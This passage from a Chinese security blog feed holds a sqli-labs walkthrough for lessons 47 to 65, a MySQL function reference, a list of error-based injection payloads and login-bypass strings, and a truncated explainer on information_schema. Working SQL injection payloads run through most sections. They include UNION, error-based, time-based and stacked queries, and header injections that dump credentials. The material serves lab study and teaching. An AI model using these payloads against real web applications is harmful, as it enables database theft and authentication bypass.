title="less-47"></a>less-47</h2><p>输入?sort&#x3D;1,回显正常，输入?sort&#x3D;1’,报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-798d701f70d97945.png" alt="图片.png"><br>根据报错提示，显示为单引号,故<br>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-47/?sort=1%27%20and%20extractvalue(1,concat(0x7,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))--+</span><br></pre></td></tr></table></figure><p>以此类推。</p><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p><code>http://localhost/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=178)</code><br><code>http://localhost/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=115)</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8efea021f130f0ad.png" alt="图片.png"></p><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>延时注入：<br><code>http://localhost/sqli-labs/Less-49/index.php?sort=1%27%20and%20(If(ascii(substr((select%20username%20from%20users%20where%20id=1),1,1))=115,0,sleep(5)))--+</code><br>或者如less-48</p><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p><code>http://localhost/sqli-labs/Less-50/?sort=1;create%20table%20less50%20like%20users</code></p><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p><code>http://localhost/sqli-labs/Less-51/?sort=1%27;create%20table%20less51%20like%20users--+</code></p><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p><code>http://localhost/sqli-labs/Less-52/?sort=1;create%20table%20less52%20like%20users--+</code></p><h2 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h2><p><code>?sort=1%27;create%20table%20less53%20like%20users–+</code></p><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>爆表：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27--+</code><br>爆列：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27gxdghjy72p%27--+</code><br>爆值：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(secret_X79M)%20from%20gxdghjy72p--+</code></p><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>多一个括号?id&#x3D;0) 次数为14次</p><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>思路同上54 ,只不过多一个括号?id&#x3D;0’) 次数为14次</p><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>思路同上，只不过 id&#x3D;”.$id.” 这里进行了双引号闭合<br><code>?id=-1”union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=’challenges’%23</code></p><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>尝试了查询database() 不返回数据。<br>那就只能试试报错注入了<br><code>?id=0’union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>同上，只不过没有单引号<br><code>?id=0 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>同上，只不过多了双引号和括号?id&#x3D;0”)<br><code>?id=0”) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>同上，只不过多了两个括号和一个双引号?id&#x3D;0’))<br><code>?id=0’)) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>union和报错注入失效<br>使用延时注入<br><code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,sleep(10))--+</code></p><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>同上62,只不过是单引号<br><code>?id=0%27and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=77,0,sleep(10))--++</code><br>正确时间短，错误时间长</p><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>同上63,只不过是双括号<br><code>?id=0))and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=77,0,sleep(10))--+</code><br>正确时间短，错误时间长</p><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>同上，只不过?id&#x3D;1”)<br><code>?id=1%22)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=79,0,sleep(10))--+</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Functions</title>
      <link href="/2019/01/22/SQL-Injection-Functions/"/>
      <url>/2019/01/22/SQL-Injection-Functions/</url>
      
        <content type="html"><![CDATA[<blockquote><p>version():mysql版本<br>user():用户名<br>database():数据库名<br>@@datadir:读取数据库路径<br>@@version_compile_os:操作系统版本<br>concat(str1,str2,…):没有分割符地连接字符串，显示数据（数据合并）<br>group_concat(str1,str2,…):连接一个组的所有字符串，并以逗号分割每一条数据，显示数据<br>into outfile：写文件{select ‘需要写的文件’ into outfile ‘目录下’}<br>select ‘123123’ into outfile ‘d:&#x2F;&#x2F;study&#x2F;1.txt’;(将123123添加至d盘study中新建1.txt文件中)<br>group_concat(列名):会把这一列中所有的内容在一行中以,隔开输出<br>select load_file(读文件路径)；<br>length（） &#x3D;&gt;计算字符串长度<br>hex（） &#x3D;&gt;字符转换为16进制<br>@@basedir MYSQL获取安装路径</p></blockquote><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><blockquote><p>group_concat(str1,str2,…):连接一个组的所有字符串，并以逗号分割每一条数据，显示数据<br>mid()函数：从一个字符串中截取出指定数量的字符<br>mid(string,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定开始位置（起始值是 1）。<br>length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。<br>substr()函数：函数返回字符串的一部分。<br>substr(string,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定在字符串的何处开始。<br>length(可选)规定被返回字符串的长度。<br>left()函数：取字符的多少位字符<br>left(string,length)<br>string(必需)规定要返回其中一部分的字符串<br>length（可选）规定被返回字符串的前length长度的字符<br>load_file()函数：导出文件<br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br>substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。*注意:这里的pos位置        是从1开始的，不是数组的0开始<br>ascii(str)：返回字符串str的最左面字符的ASCII代码值。<br>ord(str):同上，返回ascii码<br>if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0<br>concat:用于将两个字符串连接起来，形成一个单一的字符串。返回结果为连接参数产生的字符串。</p></blockquote><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML"></a>UPDATEXML</h3><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，<a href="https://www.jb51.net/article/125607.htm">了解Xpath语法</a><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br>ERROR 1105 (HY000): XPATH syntax error: ‘:root@localhost’</p></blockquote><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><blockquote><p>extractvalue()：从目标XML中返回包含所查询值的字符串<br>extractvalue (XML_document, XPath_string)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>payloaod:<br>　　and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));<br>extractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p></blockquote><h3 id="ASCII-s"><a href="#ASCII-s" class="headerlink" title="ASCII(s)"></a>ASCII(s)</h3><blockquote><p>ASCII(s)<br>返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：<br>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers;</p></blockquote><h3 id="CHAR-LENGTH-s"><a href="#CHAR-LENGTH-s" class="headerlink" title="CHAR_LENGTH(s)"></a>CHAR_LENGTH(s)</h3><blockquote><p>CHAR_LENGTH(s)<br>返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数<br>SELECT CHAR_LENGTH(“RUNOOB”) AS LengthOfString;</p></blockquote><h3 id="CHARACTER-LENGTH-s"><a href="#CHARACTER-LENGTH-s" class="headerlink" title="CHARACTER_LENGTH(s)"></a>CHARACTER_LENGTH(s)</h3><blockquote><p>CHARACTER_LENGTH(s)<br>返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数<br>SELECT CHARACTER_LENGTH(“RUNOOB”) AS LengthOfString;</p></blockquote><h3 id="CONCAT-s1-s2…sn"><a href="#CONCAT-s1-s2…sn" class="headerlink" title="CONCAT(s1,s2…sn)"></a>CONCAT(s1,s2…sn)</h3><blockquote><p>CONCAT(s1,s2…sn)<br>字符串 s1,s2 等多个字符串合并为一个字符串<br>合并多个字符串<br>SELECT CONCAT(“SQL “,  “Runoob “,  “Gooogle “,  “Facebook”) AS ConcatenatedString;</p></blockquote><h3 id="CONCAT-WS-x-s1-s2…sn"><a href="#CONCAT-WS-x-s1-s2…sn" class="headerlink" title="CONCAT_WS(x, s1,s2…sn)"></a>CONCAT_WS(x, s1,s2…sn)</h3><blockquote><p>CONCAT_WS(x, s1,s2…sn)<br>同 CONCAT(s1,s2,…) 函数，但是每个字符串直接要加上 x，x 可以是分隔符<br>合并多个字符串，并添加分隔符：<br>SELECT CONCAT_WS(“-“,  “SQL”,  “Tutorial”,  “is”,  “fun!”)AS ConcatenatedString;</p></blockquote><h3 id="FIELD-s-s1-s2…"><a href="#FIELD-s-s1-s2…" class="headerlink" title="FIELD(s,s1,s2…)"></a>FIELD(s,s1,s2…)</h3><blockquote><p>FIELD(s,s1,s2…)<br>返回第一个字符串 s 在字符串列表(s1,s2…)中的位置<br>返回字符串 c 在列表值中的位置：<br>SELECT FIELD(“c”,  “a”,  “b”,  “c”,  “d”,  “e”);</p></blockquote><h3 id="FIND-IN-SET-s1-s2"><a href="#FIND-IN-SET-s1-s2" class="headerlink" title="FIND_IN_SET(s1,s2)"></a>FIND_IN_SET(s1,s2)</h3><blockquote><p>FIND_IN_SET(s1,s2)<br>返回在字符串s2中与s1匹配的字符串的位置<br>返回字符串 c 在指定字符串中的位置：<br>SELECT FIND_IN_SET(“c”,  “a,b,c,d,e”);</p></blockquote><h3 id="FORMAT-x-n"><a href="#FORMAT-x-n" class="headerlink" title="FORMAT(x,n)"></a>FORMAT(x,n)</h3><blockquote><p>FORMAT(x,n)<br>函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。<br>格式化数字 “#,###.##” 形式：<br>SELECT FORMAT(250500.5634,  2);  –  输出  250,500.56</p></blockquote><h3 id="INSERT-s1-x-len-s2"><a href="#INSERT-s1-x-len-s2" class="headerlink" title="INSERT(s1,x,len,s2)"></a>INSERT(s1,x,len,s2)</h3><blockquote><p>INSERT(s1,x,len,s2)<br>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串<br>从字符串第一个位置开始的 6 个字符替换为 baiduu：<br>SELECT INSERT(“google.com”,  1,  6,  “baidu”);  –  输出：baiduu.com</p></blockquote><h3 id="LOCATE-s1-s"><a href="#LOCATE-s1-s" class="headerlink" title="LOCATE(s1,s)"></a>LOCATE(s1,s)</h3><blockquote><p>LOCATE(s1,s)<br>从字符串 s 中获取 s1 的开始位置<br>获取 b 在字符串 abc 中的位置：<br>SELECT LOCATE(‘st’,’myteststring’);  –  5</p></blockquote><h3 id="LEFT-s-n"><a href="#LEFT-s-n" class="headerlink" title="LEFT(s,n)"></a>LEFT(s,n)</h3><blockquote><p>LEFT(s,n) 返回字符串 s 的前 n 个字符<br>返回字符串hello 中的前两个字符<br>SELECT LEFT(‘hello’,2)  – he</p></blockquote><h3 id="LEFT-s-n-1"><a href="#LEFT-s-n-1" class="headerlink" title="LEFT(s,n)"></a>LEFT(s,n)</h3><blockquote><p>LEFT(s,n)<br>返回字符串 s 的前 n 个字符<br>返回字符串 abcde 的前两个字符：<br>SELECT LEFT(‘abcde’,2)  – ab</p></blockquote><h3 id="LOCATE-s1-s-1"><a href="#LOCATE-s1-s-1" class="headerlink" title="LOCATE(s1,s)"></a>LOCATE(s1,s)</h3><blockquote><p>LOCATE(s1,s)<br>从字符串 s 中获取 s1 的开始位置<br>返回字符串 abc 中 b 的位置：<br>SELECT LOCATE(‘b’,  ‘abc’)  –  2</p></blockquote><h3 id="LPAD-s1-len-s2"><a href="#LPAD-s1-len-s2" class="headerlink" title="LPAD(s1,len,s2)"></a>LPAD(s1,len,s2)</h3><blockquote><p>LPAD(s1,len,s2)<br>在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len<br>将字符串 xx 填充到 abc 字符串的开始处：<br>SELECT LPAD(‘abc’,5,’xx’)  – xxabc</p></blockquote><h3 id="MID-s-n-len"><a href="#MID-s-n-len" class="headerlink" title="MID(s,n,len)"></a>MID(s,n,len)</h3><blockquote><p>MID(s,n,len)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串，同 SUBSTRING(s,n,len)<br>从字符串 HELLO 中的第 2 个位置截取 3个 字符：<br>SELECT MID(“HELLO”,  2,  3) AS ExtractString;  –ELL</p></blockquote><h3 id="POSITION-s1-IN-s"><a href="#POSITION-s1-IN-s" class="headerlink" title="POSITION(s1 IN s)"></a>POSITION(s1 IN s)</h3><blockquote><p>POSITION(s1 IN s)<br>从字符串 s 中获取 s1 的开始位置<br>返回字符串 abc 中 b 的位置：<br>SELECT POSITION(‘b’  in  ‘abc’)  –  2</p></blockquote><h3 id="REPEAT-s-n"><a href="#REPEAT-s-n" class="headerlink" title="REPEAT(s,n)"></a>REPEAT(s,n)</h3><blockquote><p>REPEAT(s,n) 将字符串 s 重复 n 次<br>将字符串HELLO重复三次：<br>SELECT REPEAT(‘HELLO’,3)  </p></blockquote><h3 id="REPLACE-s-s1-s2"><a href="#REPLACE-s-s1-s2" class="headerlink" title="REPLACE(s,s1,s2)"></a>REPLACE(s,s1,s2)</h3><blockquote><p>REPLACE(s,s1,s2)<br>将字符串 s2 替代字符串 s 中的字符串 s1<br>将字符串 abc 中的字符 a 替换为字符 x：<br>SELECT REPLACE(‘abc’,’a’,’x’)  –xbc</p></blockquote><h3 id="REVERSE-s"><a href="#REVERSE-s" class="headerlink" title="REVERSE(s)"></a>REVERSE(s)</h3><blockquote><p>REVERSE(s)<br>将字符串s的顺序反过来<br>将字符串 abc 的顺序反过来<br>SELECT REVERSE(‘abc’)  – cba</p></blockquote><h3 id="RIGHT-s-n"><a href="#RIGHT-s-n" class="headerlink" title="RIGHT(s,n)"></a>RIGHT(s,n)</h3><blockquote><p>RIGHT(s,n)<br>返回字符串 s 的后 n 个字符<br>返回字符串 HELLO 的后两个字符：<br>SELECT RIGHT(‘HELLO’,2)  </p></blockquote><h3 id="RPAD-s1-len-s2"><a href="#RPAD-s1-len-s2" class="headerlink" title="RPAD(s1,len,s2)"></a>RPAD(s1,len,s2)</h3><blockquote><p>RPAD(s1,len,s2)<br>在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len<br>将字符串 xx 填充到 abc 字符串的结尾处：<br>SELECT RPAD(‘abc’,5,’xx’)  – abcxx</p></blockquote><h3 id="STRCMP-s1-s2"><a href="#STRCMP-s1-s2" class="headerlink" title="STRCMP(s1,s2)"></a>STRCMP(s1,s2)</h3><blockquote><p>STRCMP(s1,s2)<br>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1<br>比较字符串：<br>SELECT STRCMP(“A”,  “A”);  –  0</pre></p></blockquote><h3 id="SUBSTR-s-start-length"><a href="#SUBSTR-s-start-length" class="headerlink" title="SUBSTR(s, start, length)"></a>SUBSTR(s, start, length)</h3><blockquote><p>SUBSTR(s, start, length)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 ASDF 中的第 2 个位置截取 3个 字符：<br>SELECT SUBSTR(“ASDF”,  2,  3) AS ExtractString;  – SDF</p></blockquote><h3 id="SUBSTRING-s-start-length"><a href="#SUBSTRING-s-start-length" class="headerlink" title="SUBSTRING(s, start, length)"></a>SUBSTRING(s, start, length)</h3><blockquote><p>SUBSTRING(s, start, length)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 ASDF 中的第 2 个位置截取 3个 字符：<br>SELECT SUBSTRING(“ASDF”,  2,  3) AS ExtractString;  – SDF</p></blockquote><h3 id="SUBSTRING-INDEX-s-delimiter-number"><a href="#SUBSTRING-INDEX-s-delimiter-number" class="headerlink" title="SUBSTRING_INDEX(s, delimiter, number)"></a>SUBSTRING_INDEX(s, delimiter, number)</h3><blockquote><p>SUBSTRING_INDEX(s, delimiter, number)<br>返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。<br>如果 number 是正数，返回第 number 个字符左边的字符串。<br>如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,1)  – a<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,-1)    – b<br>SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(‘a<em>b</em>c<em>d</em>e’,’<em>‘,3),’</em>‘,-1)    – c</p></blockquote><h3 id="AVG-expression"><a href="#AVG-expression" class="headerlink" title="AVG(expression)"></a>AVG(expression)</h3><blockquote><p>AVG(expression)<br>返回一个表达式的平均值，expression 是一个字段<br>返回 Products 表中Price 字段的平均值：<br>SELECT AVG(Price) AS AveragePrice FROM Products;</p></blockquote><h3 id="CEIL-x"><a href="#CEIL-x" class="headerlink" title="CEIL(x)"></a>CEIL(x)</h3><blockquote><p>CEIL(x) | 返回大于或等于 x 的最小整数<br>SELECT CEIL(1.5)  –  返回2</p></blockquote><h3 id="CEILING-x"><a href="#CEILING-x" class="headerlink" title="CEILING(x)"></a>CEILING(x)</h3><blockquote><p>CEILING(x) | 返回大于或等于 x 的最小整数　<br>SELECT CEIL(1.5)  –  返回2</p></blockquote><h3 id="COUNT-expression"><a href="#COUNT-expression" class="headerlink" title="COUNT(expression)"></a>COUNT(expression)</h3><blockquote><p>COUNT(expression)<br>返回查询的记录总数，expression 参数是一个字段或者 * 号<br>返回 Products 表中 products 字段总共有多少条记录：<br>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;</p></blockquote><h3 id="FLOOR-x"><a href="#FLOOR-x" class="headerlink" title="FLOOR(x)"></a>FLOOR(x)</h3><blockquote><p>FLOOR(x) | 返回小于或等于 x 的最大整数<br>小于或等于 1.5 的整数：<br>SELECT FLOOR(1.5)  –  返回1</p></blockquote><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>几个关于floor报错原理的解释</p><ul><li><a href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a></li><li><a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></li><li><a href="http://www.cnblogs.com/xishaonian/p/6227405.html">http://www.cnblogs.com/xishaonian/p/6227405.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Twelve Types of Error Injection and Universal Statements</title>
      <link href="/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/"/>
      <url>/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/</url>
      
        <content type="html"><![CDATA[<h2 id="12种报错注入"><a href="#12种报错注入" class="headerlink" title="12种报错注入"></a>12种报错注入</h2><p> 1、通过floor报错,注入语句如下:<br>    and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br>    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br>    and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br>    and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) </p><p>5、通过join报错,注入语句如下:<br>    select * from(select * from mysql.user ajoin mysql.user b)c;   </p><p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p><h2 id="关于POST注入"><a href="#关于POST注入" class="headerlink" title="关于POST注入"></a>关于POST注入</h2><p> 常用的万能username语句：</p><blockquote><p>a ’ or 1&#x3D;1 #<br>a “) or 1&#x3D;1 #<br>a‘) or 1&#x3D;1 #<br>a” or “1”&#x3D;”1<br>‘ or ‘1’&#x3D;’1<br>‘ or (length(database())) &#x3D; 8  (用于输入’ “都没有错误)<br>‘ or (ascii(substr((select database()) ,1,1))) &#x3D; 115 # (用于输入’ “都没有错误)<br>“) or (“1”)&#x3D;(“1<br>“) or 1&#x3D;1 or if(1&#x3D;1, sleep(1), null)  #<br>“) or (length(database())) &#x3D; 8 #<br>“) or (ascii(substr((select database()) ,1,1))) &#x3D; 115  or if(1&#x3D;1, sleep(1), null)  # </p></blockquote><h3 id="post型盲注通杀payload："><a href="#post型盲注通杀payload：" class="headerlink" title="post型盲注通杀payload："></a>post型盲注通杀payload：</h3><p>uname&#x3D;admin%df’or()or%200%23&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>UPDATEXML,REFERER,COOKIE的构造</strong></p><p>User-Agent:<code>&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Referer: <code> ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>爆数据库版本信息：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br> 链接用户：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</code><br> 链接数据库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</code><br> 爆库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆表：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段内容：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detailed Discussion on information_schema</title>
      <link href="/2019/01/22/Detailed-Discussion-on-information_schema/"/>
      <url>/2019/01/22/Detailed-Discussion-on-information_schema/</url>
      
        <content type="html"><![CDATA[<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。</p><h1 id="1：关于字符集和排序规则相关的系统表"><a href="#1：关于字符集和排序规则相关的系统表" class="headerlink" title="1：关于字符集和排序规则相关的系统表"></a>1：关于字符集和排序规则相关的系统表</h1><p>CHARACTER_SETS ：存储数据库相关字符集信息（memory存储引擎）</p><p>COLLATIONS ：字符集对应的排序规则</p><p>COLLATION_CHARACTER_SET_APPLICABILITY：就是一个字符集和连线校对的一个对应关系而已</p><p>下面我们说一下character sets和collations的区别：</p><p>字符集（character sets）存储字符串，是指人类语言中最小的表义符号。例如’A’、’B’等；</p><p>排序规则（collations）规则比较字符串，collations是指在同一字符集内字符之间的比较规则</p><p>每个字符序唯一对应一种字符集，但一个字符集可以对应多种字符序，其中有一个是默认字符序(Default Collation)</p><p> MySQL中的字符序名称遵从命名惯例：以字符序对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的</p><p>看一下有关于字符集和校对相关的MySQL变量：</p><p>character_set_server：默认的内部操作字符集</p><p>character_set_client：客户端来源数据使用的字符集</p><p>character_set_connection：连接层字符集</p><p>character_set_results：查询结果字符集</p><p>character_set_database：当前选中数据库的默认字符集</p><p>character_set_system：系统元数据(字段名等)字符集</p><p>再看一下MySQL中的字符集转换过程：</p><p>（1）. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</p><p>（2）. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><p>使用每个数据字段的CHARACTER SET设定值；</p><p>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</p><p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p><p>若上述值不存在，则使用character_set_server设定值。</p><p>（3）. 将操作结果从内部操作字符集转换为character_set_results。</p><h1 id="2：权限相关的一些表"><a href="#2：权限相关的一些表" class="headerlink" title="2：权限相关的一些表"></a>2：权限相关的一些表</h1><p>SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。</p><p>TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的</p><p>COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。</p><p>USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的</p><p>通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的。可以看得到MySQL的授权也是相当的细密的，可以具体到列，这在某一些应用场景下还是很有用的，比如审计等。</p><h1 id="3：存储数据库系统的实体对象的一些表"><a href="#3：存储数据库系统的实体对象的一些表" class="headerlink" title="3：存储数据库系统的实体对象的一些表"></a>3：存储数据库系统的实体对象的一些表</h1><p>COLUMNS：存储表的字段信息，所有的存储引擎</p><p>INNODB_SYS_COLUMNS ：存放的是INNODB的元数据， 他是依赖于SYS_COLUMNS这个统计表而存在的。</p><p>ENGINES ：引擎类型，是否支持这个引擎，描述，是否支持事物，是否支持分布式事务，是否能够支持事物的回滚点</p><p>EVENTS ：记录MySQL中的事件，类似于定时作业</p><p>FILES ：这张表提供了有关在MySQL的表空间中的数据存储的文件的信息，文件存储的位置，这个表的数据是从InnoDB in-memory中拉取出来的，所以说这张表本身也是一个内存表，每次重启重新进行拉取。也就是我们下面要说的INNODB_SYS_DATAFILES这张表。还要注意一点的是这张表包含有临时表的信息，所以说和SYS_DATAFILES 这张表是不能够对等的，还是要从INNODB_SYS_DATAFILES看。如果undo表空间也配置是InnoDB 的话，那么也是会被记录下来的。</p><p>PARAMETERS ：参数表存储了一些存储过程和方法的参数，以及存储过程的返回值信息。存储和方法在ROUTINES里面存储。</p><p>PLUGINS ：基本上是MySQL的插件信息，是否是活动状态等信息。其实SHOW PLUGINS本身就是通过这张表来拉取道德数据</p><p>ROUTINES：关于存储过程和方法function的一些信息，不过这个信息是不包括用户自定义的，只是系统的一些信息。</p><p>SCHEMATA：这个表提供了实例下有多少个数据库，而且还有数据库默认的字符集</p><p>TRIGGERS 